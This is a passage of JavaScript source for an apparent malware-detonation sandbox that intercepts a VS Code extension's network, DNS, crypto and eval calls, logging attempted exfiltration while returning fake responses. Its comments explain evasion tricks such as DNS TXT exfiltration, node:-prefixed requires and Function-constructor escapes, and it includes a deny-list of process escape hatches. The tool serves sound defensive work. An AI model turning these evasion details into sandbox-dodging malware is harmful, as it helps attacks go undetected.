    setNoDelay(b)          { return this; }
    unref()                { return this; }
    ref()                  { return this; }
    pause()                { return this; }
    resume()               { return this; }
    pipe(dest)             { return dest; }
  }

  return Object.assign({}, realNet, {
    createConnection(options, cb) {
      const host = typeof options === 'string' ? options : (options.host || options.path || 'unknown');
      const port = typeof options === 'object' ? (options.port || 0) : '';
      logEvent('net', 'createConnection', { host: String(host), port: String(port) }, 'CRITICAL');
      const sock = new MockSocket();
      if (typeof cb === 'function') sock.on('connect', cb);
      setImmediate(() => sock.connect(port, host));
      return sock;
    },
    connect(options, cb) {
      return this.createConnection(options, cb);
    },
    Socket: MockSocket,
    createServer(opts, connectionListener) {
      logEvent('net', 'createServer', {}, 'WARN');
      const server = new EventEmitter();
      server.listen  = (port, host, cb) => { if (typeof cb === 'function') setImmediate(cb); return server; };
      server.close   = (cb) => { if (typeof cb === 'function') setImmediate(cb); };
      server.address = () => ({ address: '127.0.0.1', port: 0, family: 'IPv4' });
      return server;
    },
  });
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 7 — dns Hook
// ─────────────────────────────────────────────────────────────────────────────

function createDnsHook() {
  const realDns = require('dns');

  // Malware frequently exfiltrates via DNS: stolen data is encoded into the
  // subdomain labels of queries sent to an attacker-controlled nameserver,
  // often through `new dns.Resolver()` (which bypasses module-level hooks).
  class HookedResolver {
    constructor() { this._servers = []; }
    setServers(servers) {
      this._servers = Array.isArray(servers) ? servers : [servers];
      logEvent('dns', 'Resolver.setServers', { servers: this._servers.join(', ') }, 'CRITICAL');
    }
    getServers() { return this._servers; }
    _exfil(method, hostname, cb) {
      const dest = this._servers.join(', ') || 'dns';
      logEvent('dns', 'Resolver.' + method, { hostname: String(hostname), servers: dest }, 'CRITICAL');
      try { DI.scanExfil(dest, String(hostname), logEvent); } catch (e) {}
      if (typeof cb === 'function') setImmediate(() => cb(null, []));
      return Promise.resolve([]);
    }
    resolve(h, t, cb)  { if (typeof t === 'function') cb = t; return this._exfil('resolve',  h, cb); }
    resolve4(h, o, cb) { if (typeof o === 'function') cb = o; return this._exfil('resolve4', h, cb); }
    resolve6(h, o, cb) { if (typeof o === 'function') cb = o; return this._exfil('resolve6', h, cb); }
    resolveTxt(h, cb)  { return this._exfil('resolveTxt', h, cb); }
    resolveAny(h, cb)  { return this._exfil('resolveAny', h, cb); }
    cancel() {}
    setLocalAddress() {}
  }

  return Object.assign({}, realDns, {
    setServers(servers) {
      logEvent('dns', 'setServers', { servers: Array.isArray(servers) ? servers.join(', ') : String(servers) }, 'CRITICAL');
    },
    lookup(hostname, opts, cb) {
      logEvent('dns', 'lookup', { hostname: String(hostname) }, 'WARN');
      try { DI.scanExfil('dns', String(hostname), logEvent); } catch (e) {}
      if (typeof opts === 'function') { cb = opts; }
      if (typeof cb === 'function') setImmediate(() => cb(null, '127.0.0.1', 4));
    },
    resolve(hostname, type, cb) {
      logEvent('dns', 'resolve', { hostname: String(hostname), type: String(type || 'A') }, 'WARN');
      try { DI.scanExfil('dns', String(hostname), logEvent); } catch (e) {}
      if (typeof type === 'function') { cb = type; }
      if (typeof cb === 'function') setImmediate(() => cb(null, ['127.0.0.1']));
    },
    resolve4(hostname, opts, cb) {
      logEvent('dns', 'resolve4', { hostname: String(hostname) }, 'WARN');
      try { DI.scanExfil('dns', String(hostname), logEvent); } catch (e) {}
      if (typeof opts === 'function') cb = opts;
      if (typeof cb === 'function') setImmediate(() => cb(null, ['127.0.0.1']));
    },
    resolve6(hostname, opts, cb) {
      if (typeof opts === 'function') cb = opts;
      if (typeof cb === 'function') setImmediate(() => cb(null, ['::1']));
    },
    // BUG FIX: these were previously left un-overridden, so Object.assign
    // copied the REAL implementations through — resolveTxt in particular is
    // a classic DNS-exfiltration primitive (chunked data via TXT records)
    // that reached the real network with zero interception or logging.
    resolveTxt(hostname, cb) {
      logEvent('dns', 'resolveTxt', { hostname: String(hostname) }, 'CRITICAL');
      try { DI.scanExfil('dns', String(hostname), logEvent); } catch (e) {}
      if (typeof cb === 'function') setImmediate(() => cb(null, [[]]));
    },
    resolveMx(hostname, cb) {
      logEvent('dns', 'resolveMx', { hostname: String(hostname) }, 'WARN');
      if (typeof cb === 'function') setImmediate(() => cb(null, []));
    },
    resolveSrv(hostname, cb) {
      logEvent('dns', 'resolveSrv', { hostname: String(hostname) }, 'WARN');
      if (typeof cb === 'function') setImmediate(() => cb(null, []));
    },
    resolveCname(hostname, cb) {
      logEvent('dns', 'resolveCname', { hostname: String(hostname) }, 'WARN');
      if (typeof cb === 'function') setImmediate(() => cb(null, []));
    },
    resolveNs(hostname, cb) {
      logEvent('dns', 'resolveNs', { hostname: String(hostname) }, 'WARN');
      if (typeof cb === 'function') setImmediate(() => cb(null, []));
    },
    resolveSoa(hostname, cb) {
      logEvent('dns', 'resolveSoa', { hostname: String(hostname) }, 'WARN');
      if (typeof cb === 'function') setImmediate(() => cb(null, {}));
    },
    resolvePtr(hostname, cb) {
      logEvent('dns', 'resolvePtr', { hostname: String(hostname) }, 'WARN');
      if (typeof cb === 'function') setImmediate(() => cb(null, []));
    },
    resolveNaptr(hostname, cb) {
      logEvent('dns', 'resolveNaptr', { hostname: String(hostname) }, 'WARN');
      if (typeof cb === 'function') setImmediate(() => cb(null, []));
    },
    reverse(ip, cb) {
      logEvent('dns', 'reverse', { ip: String(ip) }, 'WARN');
      if (typeof cb === 'function') setImmediate(() => cb(null, []));
    },
    Resolver: HookedResolver,
    promises: {
      lookup:   (hostname) => { logEvent('dns', 'promises.lookup', { hostname: String(hostname) }, 'WARN'); return Promise.resolve({ address: '127.0.0.1', family: 4 }); },
      resolve:  (hostname) => { logEvent('dns', 'promises.resolve', { hostname: String(hostname) }, 'WARN'); return Promise.resolve(['127.0.0.1']); },
      resolve4: (hostname) => Promise.resolve(['127.0.0.1']),
      Resolver: HookedResolver,
    },
  });
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 8a-2 — tls / dgram / http2 Hooks
//  BUG FIX: these three modules weren't intercepted at all previously (not in
//  interceptMap, not in patchRequireCache), so `require('tls').connect()`,
//  `require('dgram').createSocket()`, and `require('http2').connect()` all
//  reached the real network with zero mediation — genuine, unmitigated
//  egress paths alongside the http/https/net/dns/axios hooks. Built as
//  plain fail-closed objects (child_process hook's pattern), not
//  Object.assign over the real module, so nothing un-overridden leaks
//  through.
// ─────────────────────────────────────────────────────────────────────────────

function createTlsHook() {
  function fakeTlsSocket() {
    const sock = new EventEmitter();
    sock.write = () => true; sock.end = () => {}; sock.destroy = () => {}; sock.setEncoding = () => {};
    sock.setTimeout = () => sock; sock.setKeepAlive = () => sock; sock.setNoDelay = () => sock;
    sock.authorized = true; sock.encrypted = true;
    sock.getPeerCertificate = () => ({});
    setImmediate(() => sock.emit('secureConnect'));
    return sock;
  }
  return {
    connect(...args) {
      const opts = (args[0] && typeof args[0] === 'object') ? args[0] : { host: args[0], port: args[1] };
      logEvent('net', 'tls.connect', { host: String((opts && opts.host) || ''), port: opts && opts.port }, 'CRITICAL');
      const cb = args.find((a) => typeof a === 'function');
      const sock = fakeTlsSocket();
      if (cb) setImmediate(cb);
      return sock;
    },
    createServer(...args) {
      logEvent('net', 'tls.createServer', {}, 'WARN');
      const server = new EventEmitter();
      server.listen = () => server; server.close = (cb) => { if (typeof cb === 'function') setImmediate(cb); };
      return server;
    },
    TLSSocket: function TLSSocket() { return fakeTlsSocket(); },
    checkServerIdentity: () => undefined,
    rootCertificates: [],
    getCiphers: () => [],
    DEFAULT_CIPHERS: '',
    createSecureContext: () => ({ context: {} }),
  };
}

function createDgramHook() {
  function fakeUdpSocket() {
    const sock = new EventEmitter();
    sock.send = (msg, ...rest) => {
      const cb = rest.find((a) => typeof a === 'function');
      logEvent('net', 'dgram.send', { bytes: Buffer.isBuffer(msg) ? msg.length : String(msg || '').length }, 'CRITICAL');
      if (cb) setImmediate(() => cb(null));
    };
    sock.bind = (...rest) => { const cb = rest.find((a) => typeof a === 'function'); if (cb) setImmediate(cb); return sock; };
    sock.close = (cb) => { if (typeof cb === 'function') setImmediate(cb); };
    sock.address = () => ({ address: '0.0.0.0', port: 0, family: 'IPv4' });
    sock.setBroadcast = () => {}; sock.setTTL = () => {}; sock.setMulticastTTL = () => {};
    sock.addMembership = () => {}; sock.dropMembership = () => {};
    return sock;
  }
  return {
    createSocket(...args) {
      logEvent('net', 'dgram.createSocket', {}, 'WARN');
      return fakeUdpSocket();
    },
    Socket: function Socket() { return fakeUdpSocket(); },
  };
}

function createHttp2Hook() {
  return {
    connect(authority, options, listener) {
      logEvent('net', 'http2.connect', { authority: String(authority) }, 'CRITICAL');
      const session = new EventEmitter();
      session.request = (headers) => {
        const stream = new EventEmitter();
        stream.end = () => {}; stream.write = () => true; stream.close = () => {};
        setImmediate(() => { stream.emit('response', { ':status': 200 }); stream.emit('end'); });
        return stream;
      };
      session.close = (cb) => { if (typeof cb === 'function') setImmediate(cb); };
      session.destroy = () => {};
      const cb = typeof listener === 'function' ? listener : (typeof options === 'function' ? options : null);
      if (cb) setImmediate(cb);
      return session;
    },
    createServer() {
      logEvent('net', 'http2.createServer', {}, 'WARN');
      const server = new EventEmitter();
      server.listen = () => server; server.close = (cb) => { if (typeof cb === 'function') setImmediate(cb); };
      return server;
    },
    createSecureServer() {
      logEvent('net', 'http2.createSecureServer', {}, 'WARN');
      const server = new EventEmitter();
      server.listen = () => server; server.close = (cb) => { if (typeof cb === 'function') setImmediate(cb); };
      return server;
    },
    constants: (function () { try { return require('http2').constants; } catch (e) { return {}; } })(),
  };
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 8b — axios Hook
//  apiClient.js imports axios from the extension's bundled node_modules.
//  axios uses follow-redirects internally, which bypasses a plain http/https
//  require.cache patch. Intercepting require('axios') directly is the only
//  reliable way to capture all outbound HTTP calls this extension makes.
// ─────────────────────────────────────────────────────────────────────────────

function createAxiosHook() {
  const noop = () => {};

  /** Build a chainable mock response that looks like an axios response */
  function mockResponse(url, data = {}) {
    return { data, status: 200, statusText: 'OK', headers: {}, config: { url }, request: {} };
  }

  /** Stringify an axios payload (object/string/Buffer) for beacon capture. */
  const bodyStr = (p) => p == null ? '' : (typeof p === 'string' || Buffer.isBuffer(p)) ? String(p) : (() => { try { return JSON.stringify(p); } catch { return String(p); } })();

  const instance = {
    post: async (url, payload, config) => {
      logEvent('axios', 'post', {
        url:             String(url),
        payload_preview: JSON.stringify(payload || {}).slice(0, 500),
        has_auth:        !!(config && config.headers && config.headers.Authorization),
      }, 'CRITICAL');
      recordBeacon({ transport: 'axios', destination: String(url), method: 'POST', headers: config && config.headers, body: bodyStr(payload) });
      // Return a plausible response so the extension keeps running
      return mockResponse(url, { token: 'sandbox-mock', message: 'ok', findings: [], scanType: 'basic' });
    },
    get: async (url, config) => {
      logEvent('axios', 'get', { url: String(url) }, 'CRITICAL');
      recordBeacon({ transport: 'axios', destination: String(url), method: 'GET', headers: config && config.headers, body: '' });
      return mockResponse(url, {});
    },
    put: async (url, payload, config) => {
      logEvent('axios', 'put', { url: String(url), payload_preview: JSON.stringify(payload || {}).slice(0, 300) }, 'CRITICAL');
      recordBeacon({ transport: 'axios', destination: String(url), method: 'PUT', headers: config && config.headers, body: bodyStr(payload) });
      return mockResponse(url, {});
    },
    delete: async (url, config) => {
      logEvent('axios', 'delete', { url: String(url) }, 'CRITICAL');
      recordBeacon({ transport: 'axios', destination: String(url), method: 'DELETE', headers: config && config.headers, body: '' });
      return mockResponse(url, {});
    },
    patch: async (url, payload, config) => {
      logEvent('axios', 'patch', { url: String(url), payload_preview: JSON.stringify(payload || {}).slice(0, 300) }, 'CRITICAL');
      recordBeacon({ transport: 'axios', destination: String(url), method: 'PATCH', headers: config && config.headers, body: bodyStr(payload) });
      return mockResponse(url, {});
    },
    request: async (config) => {
      const method = (config && config.method) || 'GET';
      const url    = (config && (config.url || config.baseURL)) || 'unknown';
      logEvent('axios', 'request', { method, url: String(url), payload_preview: JSON.stringify(config && config.data || {}).slice(0, 300) }, 'CRITICAL');
      recordBeacon({ transport: 'axios', destination: String(url), method: String(method).toUpperCase(), headers: config && config.headers, body: bodyStr(config && config.data) });
      return mockResponse(url, {});
    },
    create:       function(defaults) { return Object.assign({}, instance, { defaults: Object.assign({}, instance.defaults, defaults) }); },
    defaults:     { baseURL: '', headers: { common: { Accept: 'application/json' } }, timeout: 0 },
    interceptors: {
      request:  { use: () => 0, eject: noop },
      response: { use: () => 0, eject: noop },
    },
    isAxiosError: (e) => false,
    CancelToken:  { source: () => ({ token: {}, cancel: noop }), new: function() { return { token: {}, cancel: noop }; } },
    Cancel:       class Cancel { constructor(msg) { this.message = msg; } },
    isCancel:     () => false,
    all:          (promises) => Promise.all(promises),
    spread:       (cb)       => (arr) => cb(...arr),
  };
  // axios exports the instance itself as default AND as .default
  instance.default = instance;
  return instance;
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 8 — crypto Hook  (log decryption — allow execution so we see payload)
// ─────────────────────────────────────────────────────────────────────────────

function createCryptoHook() {
  const realCrypto = require('crypto');
  return Object.assign({}, realCrypto, {
    createDecipheriv(algorithm, key, iv, opts) {
      logEvent('crypto', 'createDecipheriv', {
        algorithm: String(algorithm),
        key_preview: Buffer.isBuffer(key) ? key.toString('hex').slice(0, 64) : String(key).slice(0, 64),
        iv_preview:  Buffer.isBuffer(iv)  ? iv.toString('hex').slice(0, 32)  : (iv ? String(iv).slice(0, 32) : ''),
      }, 'CRITICAL');
      return realCrypto.createDecipheriv(algorithm, key, iv, opts);
    },
    createCipheriv(algorithm, key, iv, opts) {
      logEvent('crypto', 'createCipheriv', { algorithm: String(algorithm) }, 'WARN');
      return realCrypto.createCipheriv(algorithm, key, iv, opts);
    },
  });
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 9 — Hooked require factory
//  Builds a custom require() that injects hooked modules into the VM context.
//  Falls back to the real module system for everything else.
// ─────────────────────────────────────────────────────────────────────────────

function buildSandboxedRequire(mainFile, hooked) {
  // ── BUG FIX: resolve relative requires from the entry FILE's directory ──
  // The entry file may be at <root>/dist/extension.js. If we resolve from
  // <root>/, then require('./commands/login') looks for <root>/commands/login
  // instead of <root>/dist/commands/login — causing "Cannot find module".
  // Using mainFile itself as the base anchors resolution to the correct dir.
  const _createRequire = Module.createRequire || Module.createRequireFromPath;
  if (!_createRequire) {
    throw new Error('Node.js 10.12.0 or higher is required. Run: node --version');
  }
  const baseRequire = _createRequire(mainFile);   // ← was: extensionDir/__entry__.js
  const cache       = new Map();

  /**
   * Maps require() module names to our hooked versions.
   * Keys can be exact names or lowercase matches.
   */
  const interceptMap = {
    'vscode':         () => hooked.vscode,
    'child_process':  () => hooked.childProcess,
    'http':           () => hooked.http,
    'https':          () => hooked.https,
    'fs':             () => hooked.fs,
    'fs/promises':    () => hooked.fsPromises,
    'os':             () => hooked.os,
    'net':            () => hooked.net,
    'dns':            () => hooked.dns,
    'dns/promises':   () => hooked.dns.promises ? { ...hooked.dns.promises } : {},
    'crypto':         () => hooked.crypto,
    // FIX (Bug 3): intercept axios before it loads so apiClient.js calls are logged.
    // axios bundles follow-redirects which calls the REAL http/https at resolution
    // time, bypassing our require.cache patch of http/https. Hooking axios at the
    // top level is the only reliable intercept point.
    'axios':          () => hooked.axios,
    // BUG FIX: these three were previously absent from interceptMap entirely,
    // so require('tls')/require('dgram')/require('http2') fell through to
    // baseRequire() — the REAL, unhooked module — a genuine unmitigated
    // network-egress path.
    'tls':            () => hooked.tls,
    'dgram':          () => hooked.dgram,
    'http2':          () => hooked.http2,
  };

  function sandboxedRequire(moduleName) {
    if (cache.has(moduleName)) return cache.get(moduleName);

    // Normalize the 'node:' builtin prefix so require('node:fs') is intercepted
    // exactly like require('fs'). Malware uses the node: form to dodge naive
    // hooks — this closed a gap that let whole samples run with 0 events.
    const lookup = (typeof moduleName === 'string' && moduleName.startsWith('node:'))
      ? moduleName.slice(5)
      : moduleName;

    if (interceptMap[lookup]) {
      const mod = interceptMap[lookup]();
      cache.set(moduleName, mod);
      return mod;
    }

    // Fall back to the real require, resolved from the extension's directory
    try {
      const mod = baseRequire(moduleName);
      cache.set(moduleName, mod);
      return mod;
    } catch (e) {
      process.stderr.write(`  [SANDBOX] Cannot require '${moduleName}': ${e.message}\n`);
      // Return a Proxy that returns no-ops for any property access so the
      // extension doesn't crash if it destructures the missing module.
      const stub = new Proxy({}, {
        get: (_, prop) => {
          if (prop === '__esModule') return false;
          if (prop === 'default')   return stub;
          return (...args) => {};
        },
      });
      cache.set(moduleName, stub);
      return stub;
    }
  }

  // Copy standard require properties
  sandboxedRequire.resolve    = (id) => { try { return baseRequire.resolve(id); } catch { return id; } };
  sandboxedRequire.cache      = baseRequire.cache;
  sandboxedRequire.extensions = baseRequire.extensions;
  sandboxedRequire.main       = require.main;

  return sandboxedRequire;
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 10 — VM Context Builder
//  Assembles the full sandbox context: globals + hooked require + hooked eval
// ─────────────────────────────────────────────────────────────────────────────

/**
 * BUG FIX: the raw `process` object injected into the vm context exposed
 * `process.mainModule.require` (a require path that bypasses
 * sandboxedRequire/interceptMap entirely) and `process.binding`/
 * `_linkedBinding`/`dlopen` (native-addon loading — arbitrary native code,
 * completely outside JS-level hook mediation). Deny-list just those
 * specific escape hatches via a Proxy; everything else on `process` behaves
 * exactly as before (this is deliberately NOT an allow-list, to avoid
 * silently breaking any other property/method legitimate or malicious code
 * currently reads).
 */
function buildRestrictedProcess() {
  const DENIED = new Set([
    'mainModule', 'binding', '_linkedBinding', 'dlopen', 'moduleLoadList',
    '_debugProcess', '_debugEnd', '_startProfilerIdleNotifier', '_stopProfilerIdleNotifier',
  ]);
  return new Proxy(process, {
    get(target, prop, receiver) {
      if (DENIED.has(prop)) return undefined;
      const v = Reflect.get(target, prop, target);
      return typeof v === 'function' ? v.bind(target) : v;
    },
    set(target, prop, value) {
      if (DENIED.has(prop)) return true; // silently ignore attempts to (re)install them
      target[prop] = value;
      return true;
    },
    has(target, prop) { return DENIED.has(prop) ? false : Reflect.has(target, prop); },
  });
}

/**
 * BUG FIX: Object.prototype / Array.prototype / Function.prototype (and a
 * few siblings) are among the host intrinsics aliased directly into the vm
 * context below for instanceof/type-check compatibility across the vm
 * boundary. Because they're the SAME live objects as the host's real
 * prototypes, `Object.prototype.polluted = 1` executed by detonated code
 * pollutes this process's actual prototypes — corrupting VEXGuard's own
 * subsequent code (report generation, later requires) for the rest of this
 * run. Freezing them preserves every constructor's identity (so
 * `x instanceof Array` etc. still works exactly as before) while making any
 * write to the prototype itself a silent no-op (or a thrown TypeError in
 * strict-mode code) instead of a real mutation. Existing built-in methods
 * remain fully callable — freezing only blocks reassigning/adding/deleting
 * properties on the prototype object, not invoking what's already there.
 * Safe to leave frozen for the rest of this process's life: sandbox.js is a
 * disposable, one-sample-per-process child (see runNode() in VEXGuard.js),
 * so there is no cross-sample or orchestrator-process impact.
 */
let _prototypesFrozen = false;
function freezeGlobalPrototypes() {
  if (_prototypesFrozen) return;
  _prototypesFrozen = true;
  for (const ctor of [Object, Array, Function, String, Number, Boolean, RegExp, Error, Promise, Map, Set]) {
    try { Object.freeze(ctor.prototype); } catch (e) {}
  }
}

function buildVmContext(extensionDir, mainFile, hooked, tm) {
  freezeGlobalPrototypes();

  // Pass the actual entry file so relative requires resolve from its directory
  const sandboxedRequire = buildSandboxedRequire(mainFile, hooked);
  const fakeModule       = { exports: {}, id: extensionDir, filename: extensionDir, loaded: false, parent: null, children: [], paths: [] };

  // We need a reference to `context` inside hookedEval, so we build it in two steps.
  let context;

  const sandbox = {
    // ── CommonJS module system ──────────────────────────────────────────────
    require:    sandboxedRequire,
    module:     fakeModule,
    exports:    fakeModule.exports,
    __dirname:  extensionDir,
    __filename: path.join(extensionDir, 'extension.js'),

    // ── Standard Node.js / browser globals ─────────────────────────────────
    console,
    process: buildRestrictedProcess(),
    Buffer,
    URL,
    URLSearchParams,
    TextEncoder,
    TextDecoder,
    setTimeout,
    setInterval,
    clearTimeout,
    clearInterval,
    setImmediate,
    clearImmediate,
    queueMicrotask,
    Promise,
    JSON,
    Math,
    Date,
    Error,
    TypeError,
    RangeError,
    SyntaxError,
    ReferenceError,
    EvalError,
    URIError,
    RegExp,
    Array,
    Object,
    String,
    Number,
    Boolean,
    Symbol,
    BigInt,
    Map,
    Set,
    WeakMap,
    WeakSet,
    WeakRef,
    Proxy,
    Reflect,
    ArrayBuffer,
    SharedArrayBuffer,
    DataView,
    Uint8Array, Int8Array, Uint16Array, Int16Array,
    Uint32Array, Int32Array, Float32Array, Float64Array,
    BigInt64Array, BigUint64Array,
    Uint8ClampedArray,
    Intl,
    isNaN,
    isFinite,
    parseInt,
    parseFloat,
    encodeURI,
    encodeURIComponent,
    decodeURI,
    decodeURIComponent,
    escape,
    unescape,
    undefined: undefined,
    NaN,
    Infinity,

    // ── Intercepted eval ────────────────────────────────────────────────────
    eval: function hookedEval(code) {
      const src = String(code);
      logEvent('eval', 'eval', {
        code_length: src.length,
        code_preview: src.slice(0, 600),
      }, 'CRITICAL');
      try {
        // Run the eval'd code inside the same VM context so it still uses
        // our hooked modules — this is what exposes the second-stage payload.
        return vm.runInContext(src, context, { timeout: 5000 });
      } catch (e) {
        process.stderr.write(`  [SANDBOX] eval() error: ${e.message}\n`);
        return undefined;
      }
    },

    // ── Intercepted Function constructor ────────────────────────────────────
    Function: new Proxy(Function, {
      construct(target, args) {
        const bodySrc = args.length > 0 ? String(args[args.length - 1]) : '';
        if (args.length > 0) {
          logEvent('eval', 'new Function()', {
            body_length: bodySrc.length,
            body_preview: bodySrc.slice(0, 600),
          }, 'CRITICAL');
        }
        // BUG FIX: `new target(...args)` invoked the HOST's real Function
        // constructor, so the resulting function's body executed in the
        // host V8 realm (sloppy-mode `this` resolves to the real
        // globalThis) — a second, independent escape from the instrumented
        // surface, alongside eval() above. Compile and run it inside the
        // SAME vm context instead, exactly mirroring hookedEval.
        const params = args.slice(0, -1).map(String);
        const src = `(function anonymous(${params.join(',')}) {\n${bodySrc}\n})`;
        try {
          return vm.runInContext(src, context, { timeout: 5000 });
        } catch (e) {
          process.stderr.write(`  [SANDBOX] new Function() error: ${e.message}\n`);
          return function () {};
        }
      },
      apply(target, thisArg, args) { return target.apply(thisArg, args); },
    }),

    // ── fetch (native in Node ≥ 18) ─────────────────────────────────────────
    fetch: function hookedFetch(url, opts) {
      logEvent('fetch', 'fetch', { url: String(url), method: (opts && opts.method) || 'GET' }, 'CRITICAL');
      try {
        let body = '';
        if (opts && opts.body != null) body = typeof opts.body === 'string' ? opts.body : JSON.stringify(opts.body);
        recordBeacon({ transport: 'fetch', destination: String(url), method: (opts && opts.method) || 'GET', headers: opts && opts.headers, body });
        DI.scanExfil(String(url), String(url) + '\n' + body, logEvent);
      } catch (e) {}
      // Return a Promise that resolves to an empty JSON response
      return Promise.resolve({
        ok:     true,
        status: 200,
        statusText: 'OK',
        headers: { get: () => 'application/json', has: () => false },
        json:   () => Promise.resolve({}),
        text:   () => Promise.resolve('{}'),
        arrayBuffer: () => Promise.resolve(new ArrayBuffer(0)),
        blob:   () => Promise.resolve(new Blob([])),
      });
    },

    // ── Self-referential globals ─────────────────────────────────────────────
    global:     null,  // patched below
    globalThis: null,  // patched below
  };

  // ── Time Machine: virtualize the specimen's perception of time ─────────────
  // Swap the delay-bearing timers + Date + hi-res clock for virtual versions so
  // setTimeout/setInterval/Date.now()/performance.now() are all driven by one
  // virtual clock and can be fast-forwarded. setImmediate/clearImmediate/
  // queueMicrotask stay REAL — they carry no delay (no evasion leverage) and
  // keeping them real lets Promise/IO settle naturally between virtual fires.
  if (tm) {
    const tmGlobals = tm.install();
    sandbox.setTimeout    = tmGlobals.setTimeout;
    sandbox.setInterval   = tmGlobals.setInterval;
    sandbox.clearTimeout  = tmGlobals.clearTimeout;
    sandbox.clearInterval = tmGlobals.clearInterval;
    sandbox.Date          = tmGlobals.Date;
    sandbox.performance   = tmGlobals.performance;
  }

  // Cloak the VM-level hooks so `eval.toString()` / `fetch.toString()` report
  // native code (module hooks are cloaked in runSandbox; the Function.prototype
  // .toString guard covers the reflective bypass).
  spoofNativeToString(sandbox.eval, 'eval');
  spoofNativeToString(sandbox.fetch, 'fetch');

  context = vm.createContext(sandbox);

  // Patch self-reference after context creation
  context.global     = context;
  context.globalThis = context;

  // Second-stage analyzer: run a forked/spawned LOCAL Node script inside THIS
  // instrumented context so its file reads, secret theft and exfiltration are
  // captured — instead of the payload vanishing into a blocked child process.
  secondStageRunner = function analyzeSecondStage(scriptPath) {
    try {
      if (!scriptPath) return;
      let resolved = String(scriptPath);
      if (!path.isAbsolute(resolved)) resolved = path.resolve(extensionDir, resolved);
      if (!/\.[cm]?js$/.test(resolved) && fs.existsSync(resolved + '.js')) resolved += '.js';
      if (!/\.[cm]?js$/.test(resolved)) return;       // only JS payloads
      if (SECOND_STAGE_SEEN.has(resolved))   return;
      if (secondStageActive >= SECOND_STAGE_MAX) return;
      if (!fs.existsSync(resolved))          return;
      SECOND_STAGE_SEEN.add(resolved);
      secondStageActive++;
      let src;
      try { src = fs.readFileSync(resolved, 'utf8'); } catch (e) { secondStageActive--; return; }
      logEvent('child_process', 'second_stage_analyzed', { script: resolved, bytes: src.length }, 'CRITICAL');
      process.stdout.write(`  🔬 [2ND-STAGE] Detonating forked payload: ${path.relative(extensionDir, resolved)}\n`);
      const childRequire = buildSandboxedRequire(resolved, hooked);
      const childModule  = { exports: {}, id: resolved, filename: resolved, loaded: false, children: [], paths: [] };
      const wrapper = '(function (exports, require, module, __filename, __dirname) {\n' + src + '\n})';
      try {
        const fn = vm.runInContext(wrapper, context, { filename: resolved, timeout: 8000 });
        fn(childModule.exports, childRequire, childModule, resolved, path.dirname(resolved));
      } catch (e) {
        process.stderr.write(`  [2ND-STAGE] ${path.basename(resolved)} error (often expected in mock env): ${e.message}\n`);
      } finally {
        secondStageActive--;
      }
    } catch (e) { /* never let second-stage analysis crash the primary run */ }
  };

  return { context, fakeModule };
}


// ─────────────────────────────────────────────────────────────────────────────
//  SECTION 11 — Global require.cache Patcher
//  Ensures transitive dependencies (inside node_modules) also get hooked
//  modules, not just the extension's top-level requires.
//
//  FIX (Bug 2): Also patches Module._resolveFilename so ANY module loaded via
//  the real Node require() that asks for 'vscode' (e.g. sub-modules like
//  decorationManager.js, login.js, scanCurrentFile.js) receives our mock
//  instead of crashing with "Cannot find module 'vscode'".
//
//  FIX (Bug 3b): Also patches follow-redirects in the extension's own
//  node_modules so axios's http adapter is redirected through our hooks.
// ─────────────────────────────────────────────────────────────────────────────

const VSCODE_MOCK_CACHE_ID = '__sandbox_vscode_mock__';

function patchRequireCache(extensionDir, hooked) {
  const saved   = {};
  const patches = {
    'child_process': hooked.childProcess,
    'http':          hooked.http,
    'https':         hooked.https,
    'fs':            hooked.fs,
    'fs/promises':   hooked.fsPromises,
    'os':            hooked.os,
    'net':           hooked.net,
    'dns':           hooked.dns,
    'crypto':        hooked.crypto,
    'tls':           hooked.tls,
    'dgram':         hooked.dgram,
    'http2':         hooked.http2,
    // node:-prefixed specifiers resolve to a DIFFERENT require.cache key
    // than the bare specifier, so a nested dependency using either form
    // must be covered separately — previously only the bare form was.
    'node:fs':            hooked.fs,
    'node:fs/promises':   hooked.fsPromises,
    'node:child_process': hooked.childProcess,
    'node:http':           hooked.http,
    'node:https':          hooked.https,
    'node:os':             hooked.os,
    'node:net':            hooked.net,
    'node:dns':            hooked.dns,
    'node:crypto':         hooked.crypto,
    'node:tls':            hooked.tls,
    'node:dgram':          hooked.dgram,
    'node:http2':          hooked.http2,
  };

  for (const [name, hookedMod] of Object.entries(patches)) {
    try {
      const resolved = require.resolve(name);
      saved[resolved] = require.cache[resolved];
      require.cache[resolved] = { id: resolved, filename: resolved, loaded: true, exports: hookedMod, children: [], paths: [] };
    } catch (_) {}
  }

  // ── Anti-analysis: cloak Function.prototype.toString (Task 2) ─────────────
  // A plain own-property toString() override is bypassed by the reflective
  // `Function.prototype.toString.call(hook)`. Patch the prototype once — it
  // consults the native-spoof WeakMap for our registered hooks and delegates to
  // the real toString for everything else. Restored at run end.
  saved['__restore_tostring_guard__'] = installToStringGuard();

  // ── OS-gate defeat (process.platform / process.arch) ──────────────────────
  // Entry-point payloads frequently gate on `process.platform` directly
  // (e.g. `if (process.platform !== 'win32') return;`). The extension runs in
  // the VM with the real `process`, so we override these globally for the
  // duration of the run and restore them afterwards (the sandbox's own code
  // never reads process.platform/arch, so this is safe).
  const origPlatformDesc = Object.getOwnPropertyDescriptor(process, 'platform');
  const origArchDesc     = Object.getOwnPropertyDescriptor(process, 'arch');
  try { Object.defineProperty(process, 'platform', { value: SPOOF_PLATFORM, configurable: true, enumerable: true, writable: true }); } catch (_) {}
  try { Object.defineProperty(process, 'arch',     { value: SPOOF_ARCH,     configurable: true, enumerable: true, writable: true }); } catch (_) {}
  saved['__platform_desc__'] = origPlatformDesc;
  saved['__arch_desc__']     = origArchDesc;
  process.stdout.write(`  🔵 [HOOK] Spoofed process.platform → ${SPOOF_PLATFORM} (arch ${SPOOF_ARCH}) to defeat OS-gated payloads\n`);

  // ── FIX (Bug 6): global.fetch patch ──────────────────────────────────────
  // apiClient.js calls native fetch() for the /scan/stream SSE endpoint.
  // Modules loaded via sandboxedRequire → baseRequire run in real Node.js
  // context, not the VM context where we already have a hooked fetch.
  // Patching global.fetch ensures ALL fetch() calls everywhere are captured.
  const origGlobalFetch = global.fetch;
  global.fetch = function sandboxFetch(url, opts) {
    logEvent('fetch', 'fetch', {
      url:    String(url),
      method: (opts && opts.method) || 'GET',
      has_auth: !!(opts && opts.headers && (opts.headers.Authorization || opts.headers.authorization)),
